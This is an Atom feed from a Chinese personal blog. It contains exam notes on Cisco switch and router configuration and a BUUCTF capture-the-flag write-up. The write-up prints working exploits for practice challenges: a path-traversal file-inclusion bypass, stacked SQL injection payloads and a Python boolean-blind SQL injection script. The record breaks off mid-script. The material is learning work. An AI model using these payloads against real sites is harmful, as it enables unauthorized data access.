<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fxxy</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-25T05:19:47.409Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>fxxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网络设备期末</title>
    <link href="http://example.com/2020/06/27/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/"/>
    <id>http://example.com/2020/06/27/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/</id>
    <published>2020-06-26T16:00:00.000Z</published>
    <updated>2021-10-25T05:19:47.409Z</updated>
    
    <content type="html"><![CDATA[<p>网络设备配置期末复习笔记。。</p><span id="more"></span><h2 id="配置三层交换机"><a href="#配置三层交换机" class="headerlink" title="配置三层交换机"></a>配置三层交换机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 三层交换机与其他交换机联通</span></span><br><span class="line">ip routing  </span><br><span class="line">int  与交换机连接的接口</span><br><span class="line"></span><br><span class="line">switchport trunk encapsulation dot1q</span><br><span class="line"></span><br><span class="line">switchport mode trunk</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置网关 联通其他vlan</span></span><br><span class="line">int vlan 2</span><br><span class="line">ip address 26.1.2.1（网关） 255.255.255.0</span><br><span class="line">no shutdown</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置自己的vlan时是用自己的IP  其他事网关</span></span><br></pre></td></tr></table></figure><h2 id="端口聚合"><a href="#端口聚合" class="headerlink" title="端口聚合"></a>端口聚合</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface port-channel 1</span><br><span class="line">interface range f0/</span><br><span class="line">switchport mode trunk</span><br><span class="line">channel-group 1 mode on</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 peimit tcp 26.1.2.0（不被允许的机器） 0.0.0.255 host 26.1.4.7(服务器) eq www</span><br><span class="line">access-list 101 peimit tcp 26.1.2.0（不被允许的机器） 0.0.0.255 host 26.1.4.7(服务器) eq www</span><br><span class="line"></span><br><span class="line">source-list 101 permit icmp any</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int f0/</span><br><span class="line">ip access-group 101 in / out</span><br></pre></td></tr></table></figure><h2 id="设置生成树"><a href="#设置生成树" class="headerlink" title="设置生成树"></a>设置生成树</h2><ul><li>打开生成树协议（只在三层交换机中设置）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 (默认为1)</span><br><span class="line">spanning-tree mode rapid-pvst</span><br></pre></td></tr></table></figure><ul><li>关闭vlan的生成树协议</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no spanning-tree vlan 10  //把自己创建的vlan关了</span><br></pre></td></tr></table></figure><ul><li>设置三层交换机为根交换机</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning-tree vlan 1 root primary</span><br></pre></td></tr></table></figure><h2 id="配置ospf"><a href="#配置ospf" class="headerlink" title="配置ospf"></a>配置ospf</h2><p>交换机相连的端口需改为trunk模式，两台三层交换机设置为一个网段的IP，加一个公用的vlan100，再设置端口</p><p>int vlan 100<br>ip address 26.1.100.1（路由IP） 255.255.255.0<br>no shutdown</p><p>//作用于两台三层交换机，使两端互通</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router ospf 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 分别将每个vlan的IP加进来</span></span><br><span class="line">network 26.1.2.0  0.0.0.255 area 0</span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">no network</span><br></pre></td></tr></table></figure><h2 id="设置静态路由"><a href="#设置静态路由" class="headerlink" title="设置静态路由"></a>设置静态路由</h2><p>需要先配置s0/2的IP</p><p>ospf使各个端口可以联通</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200628101529805.png" alt="image-20200628101529805"></p><ul><li>内网出去</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route 201.168.1.0(需要访问的外网服务器IP) 255.255.255.0（网关） 26.1.2.254 （下一个路由）</span><br></pre></td></tr></table></figure><h2 id="NAT配置内外网"><a href="#NAT配置内外网" class="headerlink" title="NAT配置内外网"></a>NAT配置内外网</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int  s2/0 </span><br><span class="line">ip nat  outside</span><br><span class="line"></span><br><span class="line">int f0/0</span><br><span class="line">ip nat inside</span><br></pre></td></tr></table></figure><h3 id="配置动态路由"><a href="#配置动态路由" class="headerlink" title="配置动态路由"></a>配置动态路由</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">access-list i peimit 26.1.2.0 0.0.0.255</span><br><span class="line">nat pool 1(代理池名称) 200.168.1.10(最小网段) 200.168.1.20(最大网段) netmask 255.255.255.0</span><br><span class="line">ip nat inside source list 1 pool 1</span><br></pre></td></tr></table></figure><h2 id="配置telnet-过滤"><a href="#配置telnet-过滤" class="headerlink" title="配置telnet 过滤"></a>配置telnet 过滤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 22</span><br><span class="line">access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 23</span><br><span class="line">access-list 101 permit ip any any </span><br><span class="line">int s0/0/0</span><br><span class="line">ip access-group 101 in</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="配置http、ftp过滤"><a href="#配置http、ftp过滤" class="headerlink" title="配置http、ftp过滤"></a>配置http、ftp过滤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq www</span><br><span class="line">access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq ftp</span><br><span class="line"></span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">int s0/0/0</span><br><span class="line">ip access-group 101 in</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;网络设备配置期末复习笔记。。&lt;/p&gt;</summary>
    
    
    
    
    <category term="学习" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUctf平台</title>
    <link href="http://example.com/2020/06/10/buuctf%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2020/06/10/buuctf%E5%88%B7%E9%A2%98/</id>
    <published>2020-06-09T16:00:00.000Z</published>
    <updated>2021-10-25T05:10:39.210Z</updated>
    
    <content type="html"><![CDATA[<p>刷的一些题 <span id="more"></span></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>f12源码看到source.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;<span class="comment">//声明白名单为source.php hint.php</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//截取file字段中，开头到出现?的部分</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="comment">//？在file字段中首次出现的位置</span></span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先搞清楚代码，$_REQUEST[‘file’]获取请求中的file查询参数，然后用checkFile()进行检查，是否是hint.php或者source.php，若是这两个php则输出相应内容</p><p>利用点在这2个地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="comment">//？在file字段中首次出现的位置</span></span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure><ul><li>mb_substr()：对字符串进行截取</li><li>mb_strpos()：查找指定字符串在被查找字符串中<strong>第一次</strong>出现的位置，注意噢！是第一次出现的位置，而且在查找时，他会自动给原字符串的末尾加上?</li></ul><p>在本地写个demo看一下</p><p>正常时：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702202408302.png" alt="image-20200702202408302"></p><p>不正常时：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702202454771.png" alt="image-20200702202454771"></p><p>也就是说，不管我后面会加多少个问号，多少个参数，他最终截取出来比对的，只会是第一个?出现之前的内容，这里可以这样绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?payload</span><br></pre></td></tr></table></figure><p>然后hint.php中说，flag在ffffllllaaaagggg中，下面依次向上便利目录</p><p>在第四次的时候出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702203034782.png" alt="img"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><ul><li><p>注入点:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://07494cc4-964e-492d-82b1-180e7cc2beef.node3.buuoj.cn/?inject=1&#x27; -- -</span><br></pre></td></tr></table></figure></li><li><p>字段值为2</p></li></ul><p>但是过滤了一些东西，过滤了select，update，delete，drop，insert，where且大小写绕不过</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702204750850.png" alt="image-20200702204750850"></p><ul><li>用报错注入试试获取数据库和用户<ul><li>数据库：supersqli</li><li>用户：root@localhost</li></ul></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702210831939.png" alt="image-20200702210831939"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702210800425.png" alt="image-20200702210800425"></p><p>过滤了很多关键词，下面不知道怎么办了，然后在山师傅的提醒下，用了堆叠注入。</p><p>获取数据库</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092133502.png" alt="image-20200703092133502"></p><ul><li>获取数据表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show tables; -- -</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092257405.png" alt="image-20200703092257405"></p><ul><li>获取字段名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from words -- -</span><br><span class="line">http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from `1919810931114514` -- -</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703092953775.png" alt="image-20200703092953775"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703093224292.png" alt="image-20200703093224292"></p><p>flag肯定是在1919810931114514这个表里面，但是过滤select又不知道该咋办了，看了一下WP，一种方法是置换表名和列名，因为正常查询的语句肯定为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from word where id = &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>那如果我们把存有flag的表名换成word就可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to words1;alter table` 1919810931114514` rename to words;alter table words change flag id varchar(50); -- -</span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>过滤字符</p><ul><li>“ and or order union like</li></ul><p>堆叠注入</p><ul><li><p>获取数据库</p><ul><li>test</li><li>ctftraining</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show databases;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/vxvcs.png" alt="vxvcs"></p><p>本来想一个一个试一下每个数据库中都有哪些表的，但是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;use test;show tables;</span><br></pre></td></tr></table></figure><p>这个语句不能执行，那就show一下当前这个数据库有什么表叭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show tables;</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/%7B5_%XG6MTWCGL8%7D0DE2M8JF.png" alt="{5_%XG6MTWCGL8}0DE2M8JF"></p><p>尝试获取列名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from falg</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/dsvc.png" alt="dsvc"></p><p>又被过滤了。。。</p><p>思考：flag表就在这个数据库下面，说明我们要的东西就在这里，前面测试的时候，不管输入的query是多少，输出的都只有1猜测后端的sql语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from flag</span><br></pre></td></tr></table></figure><p>我们想得到flag表的内容的话，语句应该为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from flag</span><br></pre></td></tr></table></figure><p>构造一下，query=*,1这样语句就会变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 from flag</span><br></pre></td></tr></table></figure><p>然后成功得到flag</p><p>错误</p><p>官方WP里的做法是这样的，用了一个sql_mode变量，本来的查询语句应为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $POST[&#x27;query&#x27;] || flag from flag;</span><br></pre></td></tr></table></figure><p>正常的话，他应该是这样</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704110544795.png" alt="image-20200704110544795"></p><p>而且前面测试的时候发现，有黑名单过滤输入字符串时会出错，而且输入的正确的东西时，回显的永远是1，那这样上面那个语句也说的通了，如何利用？</p><p>mysql中有个sql_mode变量，这个变量有个值，是pipes_as_concat。意思就是将管道符当作连接符，将给定的字符拼接到查询的变量，测试一下</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704111028698.png" alt="image-20200704111028698"></p><p>所以，正确解法应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;set sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200704111234900.png" alt="image-20200704111234900"></p><p>可以看到对1进行了拼接。</p><h2 id="极客大挑战-easysql"><a href="#极客大挑战-easysql" class="headerlink" title="极客大挑战 easysql"></a>极客大挑战 easysql</h2><p>注入点在username参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; or 1=1 order by 4 -- -</span><br></pre></td></tr></table></figure><p>字段数：3</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/sdf.png" alt="sdf"></p><p>一番测试发现布尔盲注</p><p>写脚本注出数据库为geek</p><ul><li>数据库名</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703165141291.png" alt="image-20200703165141291"></p><ul><li>表名</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703165910808.png" alt="image-20200703165910808"></p><p>后来用这个geekusser注列名的时候，折腾了好久都没有，然后在浏览器进行测试的时候，一不小小出来了。。。我把表名改成了geekuser</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 0,1),1,1))&lt;125,1,0) -- - &amp;password=1&#x27; or 1=1</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703175931749.png" alt="image-20200703175931749"></p><p>那让我们正常注一下</p><ul><li>列名<ul><li>id</li><li>username</li><li>password</li></ul></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200703180105904.png" alt="image-20200703180105904"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">zidian = <span class="string">&#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\;&#123;$%&amp;*()&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_res</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> zidian:</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据库名</span></span><br><span class="line">            <span class="comment">#payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- -&amp;password=1&#x27; or 1=1  &quot;.format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据表名 控制limit获取其他表</span></span><br><span class="line">            <span class="comment">#payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- - &amp;password=1&#x27; or 1=1  &quot;.format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#获取字段名</span></span><br><span class="line">            <span class="comment">#payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 3,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1&#x27; or 1=1&quot;.format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取字段值</span></span><br><span class="line">            payload = <span class="string">&quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select password from geekuser limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0)  -- - &amp;password=1&#x27; or 1=1&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            flag = requests.get(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Success&quot;</span> <span class="keyword">in</span> flag.text:</span><br><span class="line">                result = result + j</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="comment">#return result</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_res())</span><br><span class="line"><span class="comment"># payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),1,1))=115,1,0) -- -&#x27;</span></span><br><span class="line"><span class="comment"># flag = requests.get(payload)</span></span><br><span class="line"><span class="comment"># 